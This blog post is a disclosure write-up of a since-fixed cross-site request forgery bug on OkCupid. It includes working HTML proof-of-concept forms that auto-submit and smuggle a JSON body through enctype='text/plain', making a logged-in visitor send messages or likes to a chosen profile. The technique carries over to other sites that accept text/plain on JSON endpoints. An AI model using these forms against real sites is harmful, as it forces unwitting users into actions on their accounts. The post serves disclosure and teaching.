---
title: how to be popular
author: yan
date: 2021-08-02
url: /csrf/

---

This is a quick blog post about a security vulnerability (now fixed) that allowed me to make anyone like or message a profile on okcupid.com simply by getting them to click a link on my website. In doing so, I used one of the most boring web application security issues (CSRF) combined with a somewhat interesting JSON type confusion.

Proof that it worked on a friend who agreed to help me with security testing and is definitely NOT a rabbit:

![Definitely not a rabbit](https://user-images.githubusercontent.com/549654/127944881-d9862841-fc49-459d-81fe-495e60e0e68b.png)

## A short recap of CSRF

The story, like many, began with me opening devtools and checking if websites were sending CSRF tokens alongside requests that require authentication, like sending messages to another user from your account. [CSRF](https://en.wikipedia.org/wiki/Cross-site_request_forgery) is an attack whereby an attacker sends a link to a victim which, when visited in the victim's browser, performs some action on behalf of the victim on a site that they are logged into. So for instance, if Bob is logged into Facebook, and Facebook doesn't have CSRF mitigations on the endpoint that deletes a user's account, then Alice can trick him into deleting his Facebook account by sending him a hidden link to `https://facebook.com/delete` (which is not the actual URL that deletes your FB account). 

In this case, I noticed that OkCupid messages are sent via POST requests to `https://www.okcupid.com/1/apitun/messages/send` with a JSON-encoded body like so:

```
{"receiverid": "123", "body": "sup"}
```

Conspicuously, there was no CSRF token sent in the request. CSRF tokens are a common way to mitigate these attacks by including an unguessable secret token as an additional HTTP header or POST parameter. The receiving endpoint only allows the request after validating the token; the idea being that while Bob's authentication cookies are sent automatically by his browser when he clicks on Alice's malicious link, Alice isn't able to include a valid CSRF token in the link and therefore the request will fail. 

## But what about the same-origin policy?

Web developers should be aware that the most fundamental security policy of the web is the same-origin policy: a website on one origin (AKA a scheme + host tuple) running in the browser should not be able to access data on a distinct origin unless the other origin explicitly allows it via a mechanism like [Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) (CORS). You might be tempted to think that CSRF isn't possible if your website doesn't send a CORS header.

The problem is that certain types of requests don't care about CORS, and the rules for this are not obvious. For instance:

1. If your site tries to GET a cross-origin image using XHR, it's blocked by default.
2. If your site instead loads the image via an `img` tag instead, it works.
3. If your site sends a POST to another origin via the fetch API, it's blocked by default.
4. If your site instead sends the POST by clicking the submit button on an HTML `form` element via javascript, it works.

## Doing it in practice

So how do we create a webpage which sends a cross-origin POST request to the OkCupid message-sending endpoint? This was attempt #1:

```
<html>
  <body>
    <form id="form" method="post" action="https://www.okcupid.com/1/apitun/messages/send">
      <input style='display:none' name='foo' value='bar'>
      <input type="submit" value="Click me">
    </form>
    <script>
      window.onload = () => {form.submit()}
    </script>
  </body>
</html>
```

I visited this on a localhost server and got a very helpful error message after the form was auto-submitted:

![attempt
1](https://user-images.githubusercontent.com/549654/127945076-e050e29b-b620-414f-b470-367a08824e4a.png)

Interesting - it's not complaining that the request is initiated by some random origin, but rather that the POST body (`foo=bar`) is invalid JSON! Maybe we can fix that with a weird trick:

```
<html>
  <body>
    <form id="form" method="post" action="https://www.okcupid.com/1/apitun/messages/send">
      <input style='display:none' name='{"foo":"' value='bar"}'>
      <input type="submit" value="Click me">
    </form>
    <script>
      window.onload = () => {form.submit()}
    </script>
  </body>
</html>
```

My reasoning here was that the browser converts the `name` and `value` attributes on HTML `input` elements into `name=value` in the POST body that gets sent over the wire; so if `name` is `{"foo":"` and `value` is `bar"}`, this would become `{"foo":"=bar"}` which would be JSON-parsed into the bizarre-looking object `{foo: '=bar'}` without a problem. With a rush of hope unfelt since before the pandemic, I loaded this up in my browser and saw:

![attempt
2](https://user-images.githubusercontent.com/549654/127944894-831c314c-590c-47a8-93a5-b80aa03ce663.png)

... the exact same error. But this time it was because my beautiful POST body had been URL-encoded to become the ugly-but-safe string `%7B%22foo%22%3A%22%3Dbar%22%7D`. If only there were a way to tell the browser to not encode this form body!

Luckily the W3C deities gave us exactly such a gift in the form (pun intended) of the `enctype` [attribute](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/enctype). 

```
<html>
  <body>
    <form id="form" method="post" enctype="text/plain" action="https://www.okcupid.com/1/apitun/messages/send">
      <input style='display:none' name='{"foo":"' value='bar"}'>
      <input type="submit" value="Click me">
    </form>
    <script>
      window.onload = () => {form.submit()}
    </script>
  </body>
</html>
```

With the help of `enctype="text/plain"`, the payload is finally sent in its true form (pun intended again) of `{"foo":"=bar"}`:

![attempt 3](https://user-images.githubusercontent.com/549654/127944886-2a7199f1-425e-4bd0-87c4-3076c56061f1.png)

Putting it all together, the following HTML will automatically send a message that says "I am a rabbit" to the fake userID 123. (Finding out someone's real userID is left as an exercise to the reader.)

```
<html>
  <body>
    <form id="form" method="post" action="https://www.okcupid.com/1/apitun/messages/send" enctype="text/plain">
      <input style='display:none' name='{"foo":"' value='", "receiverid":"123", "body":"i am a rabbit", "source":"desktop_global", "service":"other"}'>
      <input type="submit" value="Click me">
    </form>
    <script>
      window.onload = () => {form.submit()}
    </script>
  </body>
</html>
```

Note that the POST body becomes `{"foo":"=", "receiverid":"123", "body":"i am a rabbit","source":"desktop_global", "service":"other"}`. Because the browser inserts a `=` between the name and value attributes, this gets set to the value of a dummy key, `foo`, which okcupid fortunately ignores. 

I uploaded this HTML to my website, visited the link, and voila:

![finally](https://user-images.githubusercontent.com/549654/127944883-6232b92f-589f-41e3-b25f-a4bd1e3df794.png)

It works! ... Or would work if I had finished my test profile so I could send messages to other users.

Too lazy to do this myself, I sent my CSRF link with my own userID filled in to some friends. Lo and behold, my OkCupid test profile was seranaded by a series of messages that they didn't mean to send me.

![beloved](https://user-images.githubusercontent.com/549654/127944878-d4ad3456-8b26-4248-8a3a-2970aca6703a.png)

I briefly felt very popular, which made it all worthwhile.

## Parting thoughts

Besides making other users unknowingly message your OkCupid profile or someone else's profile of your choosing, I found you could use essentially the same vulnerability to get other users to "like" your profile. Obviously you could abuse this in order to match with anyone you could trick into clicking a link, or you could spam the link to a bunch of people to increase your profile's rankings in whatever mysterious algorithm OkCupid uses to suggest people.

It also occurred to me that if I redirected my website to the CSRF link that automatically sent a message to me, I could see the OkCupid profiles of my website visitors who were logged into okcupid.com, which would make for an intense web analytics tool.

The obvious fix is for OkCupid to require a CSRF token for these authenticated endpoint, but my attack also relied on the fact that these endpoints were happy to accept POSTs with `content-type: text/plain` even though they actually expected JSON. This made me curious if other sites were making the same mistake, so I quickly scraped some of the Alexa top sites looking for requests to endpoints containing `api` or `json`.

Once I had a list of a few hundred endpoints, I sent each of them a POST with `content-type: text/plain` and body `{"foo":"bar"}`. 87 out of 215 of these endpoints didn't error, and many appeared to return JSON responses indicating success. Granted most of these are probably not authenticated endpoints and some of them may need to accept non-JSON text, but this suggests to me that developers should be careful accepting `text/plain` inputs on endpoints that parse JSON.

### Disclosure timeline

This was reported to OkCupid in April 2021. According to their team, it was fixed without delay which prevented exploitation of the bug. I would like to thank their security team for the bounty and permission to share this blog post.
